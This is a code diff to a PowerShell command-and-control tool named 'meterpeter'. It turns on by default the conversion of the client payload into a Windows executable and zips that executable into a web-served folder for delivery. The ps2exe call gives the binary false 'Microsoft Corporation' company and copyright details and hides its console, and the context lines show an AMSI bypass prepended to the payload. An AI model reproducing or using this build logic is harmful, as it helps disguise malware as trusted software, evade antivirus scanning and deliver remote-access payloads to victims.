@@ -41,7 +41,7 @@
 ## Meterpeter Develop version
 $dev_Version = "2.10.6";
 ## Auto-Convertion of Client.ps1 to standalone executable
-$Converter = $False
+$Converter = $True
 
 
 function Character_Obfuscation($String)
@@ -312,6 +312,7 @@ $My_Output = "$Amsi_Bypass"+"$PowerShell_Payload" | Out-File -FilePath $IPATH$pa
 
 
 $PS2EXE = $env:OS
+$compression = $False
 ## Auto-Convertion of Client.ps1 to standalone executable
 If($Converter -eq $True -and $PS2EXE -eq 'Windows_NT'){
     Write-Host "   Auto-Convertion of $payload_name.ps1 to standalone executable" -ForeGroundColor Green
@@ -320,6 +321,7 @@ If($Converter -eq $True -and $PS2EXE -eq 'Windows_NT'){
     .\ps2exe.ps1 -inputFile "$payload_name.ps1" -outputFile "$payload_name.exe" -iconFile 'meterpeter.ico' -title 'meterpeter binary file' -version '2.10.6' -description 'meterpeter binary file' -product 'meterpeter C2 Client' -company 'Microsoft Corporation' -copyright '©Microsoft Corporation. All Rights Reserved' -noConsole -noVisualStyles -noError
     Copy-Item -Path "$payload_name.exe" -Destination $IPATH$payload_name.exe -Force -ErrorAction SilentlyContinue;
     Remove-Item -Path "$payload_name.exe" -Force -ErrorAction SilentlyContinue
+    $compression = $True
     cd $IPATH
   }
 
@@ -374,6 +376,13 @@ $check = $Null;
 $python_port = $Null;
 $Server_port = $Null;
 $Python_version = $Null;
+
+If($compression -eq $True){
+    ## Auto-Convertion of Client.ps1 to standalone executable
+    Remove-Item -Path "$APACHE$Dropper_Name.zip" -Force -ErrorAction SilentlyContinue
+    Compress-Archive -LiteralPath $IPATH$payload_name.exe -DestinationPath $APACHE$payload_name.zip -Force
+}
+
 ## End of venom function
 
 
